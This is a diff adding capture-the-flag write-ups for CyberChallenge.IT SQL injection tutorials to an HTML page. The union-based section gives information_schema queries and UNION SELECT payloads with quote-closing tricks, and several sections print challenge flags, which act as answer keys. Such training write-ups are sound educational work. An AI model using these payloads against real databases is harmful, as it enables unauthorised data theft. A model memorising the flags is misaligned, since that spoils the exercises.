@@ -51,7 +51,10 @@
           <hr style="margin-bottom: 0em; width: 20%; margin-left: 42%;">
           <ol>
             <h5> Week 2 </h5>
-            <li> <a href="#"> coming soon ... </a></li>
+            <li> <a href="#sql-injection-tutorial-1"> SQL Injection Tutorial 1 - Points: 500 </a></li>
+            <li> <a href="#sql-injection-tutorial-2"> SQL Injection Tutorial 2 - Points: 500 </a></li>
+            <li> <a href="#sql-injection-tutorial-3"> SQL Injection Tutorial 3 - Points: 500 </a></li>
+            <li> <a href="#sql-injection-tutorial-4"> SQL Injection Tutorial 4 - Points: 500 </a></li>
           </ol>
         </dl>
         <hr style="margin-bottom: 3em; width: 30%; margin-left: 35%;">
@@ -349,6 +352,235 @@ if(isset($_POST['code'])){
         <dl>
           <blockquote>
             <p class="ctf"><strong>  </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="sql-injection-tutorial-1">
+          <dt> SQL Injection Tutorial 1 - Points: 500 </dt>
+          <dd> <a href="http://sqlinjection.challs.cyberchallenge.it/logic" style="color: #e94892;"> http://sqlinjection.challs.cyberchallenge.it/logic </a></dd>
+        </dl>
+
+        <dl>
+          As we can see from the image below this is a <b>Logical Injections</b> SQL type challenge
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-01-sql_injection_tut_1_1.png')" >
+            <img src="img/9-01-sql_injection_tut_1_1.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-01-sql_injection_tut_1_2.png')" >
+            <img src="img/9-01-sql_injection_tut_1_2.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-01-sql_injection_tut_1_3.png')" >
+            <img src="img/9-01-sql_injection_tut_1_3.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{1s_ths_h0w_l0g1ns_w0rk} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="sql-injection-tutorial-2">
+          <dt> SQL Injection Tutorial 2 - Points: 500 </dt>
+          <dd> <a href="http://sqlinjection.challs.cyberchallenge.it/union" style="color: #e94892;"> http://sqlinjection.challs.cyberchallenge.it/union </a></dd>
+        </dl>
+
+        <dl>
+          As we can see from image below this is <b> Union Based </b> SQL type challenge
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_1.png')" >
+            <img src="img/9-02-sql_injection_tut_2_1.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_2.png')" >
+            <img src="img/9-02-sql_injection_tut_2_2.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_3.png')" >
+            <img src="img/9-02-sql_injection_tut_2_3.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_4.png')" >
+            <img src="img/9-02-sql_injection_tut_2_4.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_5.png')" >
+            <img src="img/9-02-sql_injection_tut_2_5.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <dl>
+          Using the following query, you can retrieve all the tables that are accessible by the current user
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-sql">
+SELECT table_name FROM information_schema.tables
+          </code></pre>
+        </div>
+
+        <dl>
+          Because there are a lot of ""system"" tables, that don't contain any useful information, you may want to exclude them by querying only for tables that are in the current schema. In order to retrieve the current schema, you can use the function <code>DATABASE()</code>. So the above query becomes:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-sql">
+SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE()
+          </code></pre>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_6.png')" >
+            <img src="img/9-02-sql_injection_tut_2_6.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          And for retrieving a list of all columns of a particular table:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-sql">
+SELECT column_name FROM information_schema.columns WHERE table_name = '*name_of_the_table*'
+          </code></pre>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_7.png')" >
+            <img src="img/9-02-sql_injection_tut_2_7.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          You can also retrieve all columns-tables with the following query:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-sql">
+SELECT table_name,column_name from information_schema.columns WHERE table_schema=DATABASE()
+          </code></pre>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_8.png')" >
+            <img src="img/9-02-sql_injection_tut_2_8.png" alt="" />
+          </figure>
+        </div>
+
+        <dl>
+          Now you have anything that you need to retrive the flag; You only need to adapt the queries. The only problem you can encounter is the closing <code>'</code>, that will break your sintax. You have two options: <br>
+           - You comment it out, using the MySQL comment syntax -- (note that it needs a space character at the end) <br>
+           -  You can add an <code>AND</code> clause to the where that is always true, for example:
+        </dl>
+
+        <div class="row-full code">
+          <pre><code class="prism language-sql">
+UNION SELECT first_column,second_column,3,4,5,6 FROM table WHERE somecolumn='something' --
+UNION SELECT first_column,second_column,3,4,5,6 FROM table WHERE somecolumn='something' and 1='1
+          </code></pre>
+        </div>
+        <br>
+
+        <dl>
+          In this way, the append quote will close the <code>1='1</code>, and the query will be syntactically correct. <br> <br>
+
+          Let's try to retrieve our flag
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_9.png')" >
+            <img src="img/9-02-sql_injection_tut_2_9.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-02-sql_injection_tut_2_10.png')" >
+            <img src="img/9-02-sql_injection_tut_2_10.png" alt="" />
+          </figure>
+        </div>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{Uni0ns_4re_so_tr1vi4l} </strong></p>
+          </blockquote>
+        </dl>
+        </div>
+        <hr>
+<!-- Finish post  -->
+<!-- Start Post  -->
+        <dl class="anchor" id="sql-injection-tutorial-3">
+          <dt> SQL Injection Tutorial 3 - Points: 500 </dt>
+          <dd> <a href="http://sqlinjection.challs.cyberchallenge.it/blind
+" style="color: #e94892;"> http://sqlinjection.challs.cyberchallenge.it/blind</a></dd>
+        </dl>
+
+        <dl>
+          As we can see from the image below this is a <b>Blind</b> SQL type challenge
+        </dl>
+
+        <div class="fig-container">
+          <figure class="zoom" onmousemove="zoom(event)"
+          style="background-image: url('img/9-03-sql_injection_tut_3_1.png')" >
+            <img src="img/9-03-sql_injection_tut_3_1.png" alt="" />
+          </figure>
+        </div>
+        <br>
+
+        <div class="scrolling-wrapper">
+        <dl>
+          <blockquote>
+            <p class="ctf"><strong> CCIT{} </strong></p>
           </blockquote>
         </dl>
         </div>
